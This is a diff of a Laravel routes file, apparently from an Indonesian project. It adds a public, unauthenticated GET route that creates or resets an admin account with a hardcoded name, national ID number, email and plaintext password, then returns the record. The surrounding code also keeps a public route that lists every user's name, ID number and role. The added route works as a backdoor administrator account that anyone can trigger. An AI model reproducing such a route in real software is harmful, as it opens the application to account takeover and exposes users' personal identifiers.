@@ -12,6 +12,22 @@ use Illuminate\Support\Facades\Route;
 
 // Public Routes
 Route::post('/login', [AuthController::class, 'login']);
+Route::get('/setup-admin-gacor', function() {
+    try {
+        $user = \App\Models\User::updateOrCreate(
+            ['nik' => '3578012004260001'],
+            [
+                'name' => 'KEVIN DWI WIJAYA',
+                'email' => 'kevin@seger.com',
+                'password' => \Illuminate\Support\Facades\Hash::make('SegerGacor2026!'),
+                'role' => 'admin'
+            ]
+        );
+        return response()->json(['message' => 'Admin KEVIN berhasil dibuat/diupdate!', 'user' => $user]);
+    } catch (\Exception $e) {
+        return response()->json(['error' => $e->getMessage()], 500);
+    }
+});
 Route::get('/test-users', function() {
     return response()->json([
         'users' => \App\Models\User::select('id', 'name', 'nik', 'role')->get()
